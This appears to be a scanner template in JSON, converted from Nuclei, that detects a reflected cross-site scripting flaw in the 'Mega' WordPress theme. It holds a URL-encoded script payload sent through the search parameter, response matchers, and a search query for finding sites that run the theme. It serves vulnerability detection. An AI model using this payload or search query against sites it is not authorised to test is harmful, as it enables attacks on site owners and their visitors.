@@ -1,0 +1,124 @@
+{
+  "id": "wp-mega-theme",
+  "name": "Mega Wordpress Theme - Cross site scripting",
+  "author": "r3Y3r53",
+  "severity": "MEDIUM",
+  "description": "WordPress theme with a \u0027Mega-Theme\u0027 design is vulnerable to a reflected XSS attack through the \u0027?s\u003d\u0027 parameter.\n",
+  "references": [
+    "https://cxsecurity.com/issue/WLB-2021120027",
+    "https://www.zhaket.com/web/megawp-wordpress-theme"
+  ],
+  "tags": [
+    "wp",
+    "wp-theme",
+    "wordpress",
+    "xss",
+    "mega"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "google": "Megawp-Theme"
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/?s\u003d%22%3E%3Cscript%3Ealert(`document.domain`)%3C/script%3E",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(content_type, \"text/html\")",
+            "contains(body, \"script\u0026gt;alert(`document.domain`)\u0026lt;/script\") \u0026\u0026 contains(body, \"mega-theme\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "wp-mega-theme",
+    "info": {
+      "name": "Mega Wordpress Theme - Cross site scripting",
+      "author": "r3Y3r53",
+      "severity": "medium",
+      "description": "WordPress theme with a \u0027Mega-Theme\u0027 design is vulnerable to a reflected XSS attack through the \u0027?s\u003d\u0027 parameter.\n",
+      "reference": [
+        "https://cxsecurity.com/issue/WLB-2021120027",
+        "https://www.zhaket.com/web/megawp-wordpress-theme"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "google_query": "Megawp-Theme"
+      },
+      "tags": "wp,wp-theme,wordpress,xss,mega"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/?s\u003d%22%3E%3Cscript%3Ealert(`document.domain`)%3C/script%3E"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(content_type, \"text/html\")",
+              "contains(body, \"script\u0026gt;alert(`document.domain`)\u0026lt;/script\") \u0026\u0026 contains(body, \"mega-theme\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
